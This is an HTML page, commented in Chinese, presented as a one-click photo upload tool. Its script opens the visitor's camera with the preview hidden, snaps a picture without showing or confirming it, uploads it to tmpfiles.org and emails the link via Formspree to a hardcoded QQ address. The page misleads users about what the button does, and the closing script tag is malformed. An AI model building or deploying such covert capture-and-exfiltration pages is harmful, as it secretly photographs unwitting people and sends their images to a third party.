<!DOCTYPE html>
<html>
<head>
    <title>一键拍照上传</title>
    <style>
        /* 极简样式：仅保留按钮和提示文字 */
        #uploadBtn {
            padding: 12px 24px;
            font-size: 16px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }
        #uploadBtn:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        #tip {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }
        /* 隐藏摄像头画面（自动拍摄，无需用户看） */
        #camera {
            display: none;
        }
    </style>
</head>
<body>
    <!-- 仅保留一个上传按钮 -->
    <button id="uploadBtn" onclick="startUpload()">点击上传照片</button>
    <!-- 上传提示文字 -->
    <div id="tip"></div>
    <!-- 隐藏的摄像头容器（自动调用，用户看不到） -->
    <video id="camera" autoplay muted></video>

    <script>
        let stream = null; // 摄像头流，用于拍摄后关闭

        // 核心逻辑：点击按钮→调用摄像头→自动拍摄→上传→关闭摄像头
        async function startUpload() {
            const btn = document.getElementById('uploadBtn');
            const tip = document.getElementById('tip');
            
            // 禁用按钮，防止重复点击
            btn.disabled = true;
            tip.innerText = '正在调用摄像头...';

            try {
                // 1. 调用摄像头（自动获取权限）
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const camera = document.getElementById('camera');
                camera.srcObject = stream;

                // 2. 等待摄像头加载完成后自动拍摄（延迟500ms确保画面就绪）
                await new Promise(resolve => setTimeout(resolve, 500));
                const photoBlob = await takePhotoAuto(camera);

                // 3. 关闭摄像头（拍摄完成后立即关闭，保护隐私）
                stopCamera();

                // 4. 上传照片到临时存储
                tip.innerText = '正在上传照片...';
                const photoUrl = await uploadToTmpfiles(photoBlob);

                // 5. 发送照片链接到你的QQ邮箱（需替换Formspree接口）
                await sendEmail(photoUrl);

                // 上传成功提示
                tip.innerText = '✅ 照片上传成功！';
                tip.style.color = '#008000';
            } catch (err) {
                // 失败提示
                tip.innerText = `❌ 上传失败：${err.message}`;
                tip.style.color = '#ff0000';
                console.error('错误详情：', err);
                // 失败后也关闭摄像头
                stopCamera();
            } finally {
                // 恢复按钮可用
                setTimeout(() => {
                    btn.disabled = false;
                    tip.innerText = ''; // 5秒后清空提示
                }, 5000);
            }
        }

        // 自动拍摄（无需用户确认，直接生成照片Blob）
        function takePhotoAuto(video) {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 300;
                canvas.height = video.videoHeight || 200;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => resolve(blob), 'image/jpeg');
            });
        }

        // 关闭摄像头流
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
        }

        // 上传照片到tmpfiles.org（稳定的临时存储）
        async function uploadToTmpfiles(blob) {
            const formData = new FormData();
            formData.append('file', blob, `用户照片_${Date.now()}.jpg`);
            
            const res = await fetch('https://tmpfiles.org/api/v1/upload', {
                method: 'POST',
                body: formData
            });
            const data = await res.json();
            
            if (!data.data?.url) throw new Error('照片存储失败');
            return data.data.url;
        }

        // 发送邮件到你的QQ邮箱（替换为你的Formspree接口）
        async function sendEmail(photoUrl) {
            // 步骤：
            // 1. 访问 https://formspree.io/ 注册免费账号
            // 2. 新建Form，复制生成的Endpoint地址（如 https://formspree.io/f/xxxxxx）
            // 3. 替换下面的 YOUR_FORMSPREE_ENDPOINT 为该地址
            const formspreeEndpoint = 'YOUR_FORMSPREE_ENDPOINT';
            
            const res = await fetch(formspreeEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    subject: '新用户上传照片',
                    message: `照片链接（有效期30天）：${photoUrl}`,
                    to: '2952072725@qq.com'
                })
            });
            
            if (!res.ok) throw new Error('邮件发送失败');
        }
    </style>
</body>
</html>
